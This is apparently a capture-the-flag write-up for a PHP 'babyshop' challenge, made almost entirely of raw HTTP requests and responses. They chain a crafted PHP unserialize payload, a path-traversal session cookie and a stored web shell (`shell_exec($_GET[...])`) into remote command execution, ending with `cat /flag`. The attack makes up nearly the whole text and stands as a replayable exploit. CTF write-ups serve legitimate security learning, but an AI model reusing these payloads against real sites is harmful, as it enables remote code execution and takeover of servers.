# babyshop

Get source in .git
Most important file is init.php
Deobfuscate manulally. Different init_edit.php.bak* represent my different steps of deobfuscation. Made init_edit_serialized.php - to generate required serialized object

#### Create note, unserialize exploit (would be used as a session file)
```
POST /note.php HTTP/1.1
Host: 45.63.19.130:8010
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 554
Origin: http://45.63.19.130:8010
DNT: 1
Connection: close
Referer: http://45.63.19.130:8010/note.php
Cookie: PHPSESSID=7ccb56b4ab8d0729df3asasdfasdfasdfzzpz
Upgrade-Insecure-Requests: 1

note=balance|i:999999;items|O%3A9%3A%22%E9%80%A0%E9%BD%BF%E8%BD%AE%22%3A4%3A%7Bs%3A15%3A%22%00%2A%00%E6%9C%9D%E6%8B%9C%E5%9C%A3%E5%9C%B0%22%3Bs%3A7%3A%22storage%22%3Bs%3A9%3A%22%00%2A%00%E8%B4%A1%E5%93%81%22%3Bs%3A43%3A%22asdfasdf00%2F..%2Fsess_haaaaaaaaaaack_code_fil1%22%3Bs%3A9%3A%22%00%2A%00%E5%9C%A3%E6%AE%BF%22%3Bs%3A25%3A%22myexploooooooooit2345.php%22%3Bs%3A9%3A%22%00%2A%00%E7%A6%81%E5%9C%B0%22%3Ba%3A4%3A%7Bi%3A0%3Bs%3A3%3A%22php%22%3Bi%3A1%3Bs%3A4%3A%22flag%22%3Bi%3A2%3Bs%3A4%3A%22html%22%3Bi%3A3%3Bs%3A8%3A%22htaccess%22%3B%7D%7Dnote|s:0:"";
```
#### Check
```
GET /storage/note_7ccb56b4ab8d0729df3asasdfasdfasdfzzpz HTTP/1.1
Host: 45.63.19.130:8010
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sun, 30 Aug 2020 20:27:26 GMT
If-None-Match: "3a-5ae1e1d3a549a"
```
```
HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 21:32:41 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Sun, 30 Aug 2020 21:32:33 GMT
ETag: "125-5ae1f06206067"
Accept-Ranges: bytes
Content-Length: 293
Connection: close

balance|i:999999;items|O:9:....
```
#### Create PHP shell and store inside session (extension is restricted, so can't just name it as ".php") 
```
POST /shop.php HTTP/1.1
Host: 45.63.19.130:8010
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://45.63.19.130:8010
DNT: 1
Connection: close
Referer: http://45.63.19.130:8010/note.php
Cookie: PHPSESSID=haaaaaaaaaaack_code_fil1
Upgrade-Insecure-Requests: 1

id=<?=shell_exec($_GET["zzz"]);?>
```
#### Check
```
GET /storage/sess_haaaaaaaaaaack_code_fil1 HTTP/1.1
Host: 45.63.19.130:8010
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sun, 30 Aug 2020 20:27:26 GMT
If-None-Match: "3a-5ae1e1d3a549a"
```
```
HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 21:35:04 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Sun, 30 Aug 2020 21:34:57 GMT
ETag: "6e-5ae1f0eba850f"
Accept-Ranges: bytes
Content-Length: 110
Connection: close

balance|i:2233;items|a:2:{i:0;s:17:"<?=print(1234);?>";i:1;s:30:"<?=shell_exec($_GET["zzz"]);?>";}note|s:0:"";
```
#### Use session as from creted note. Will result in unserialize and create php file from session file
```
GET /account.php HTTP/1.1
Host: 45.63.19.130:8010
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://45.63.19.130:8010/note.php
Cookie: PHPSESSID=7ccb56b4ab8d0729df33bac0b1e4fe30asd0000/../note_7ccb56b4ab8d0729df3asasdfasdfasdfzzpz
Upgrade-Insecure-Requests: 1
```
#### Use shell
```
GET /storage/note_myexploooooooooit2345.php?zzz=cat+/flag HTTP/1.1
Host: 45.63.19.130:8010
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sun, 30 Aug 2020 20:27:26 GMT
If-None-Match: "3a-5ae1e1d3a549a"
```
```
HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 21:35:55 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Vary: Accept-Encoding
Content-Length: 111
Connection: close
Content-Type: text/html; charset=UTF-8

balance|i:2233;items|a:2:{i:0;s:17:"12341";i:1;s:30:"GACTF{94c505aa-6277-4285-9326-745551ad826c}";}note|s:0:"";
```
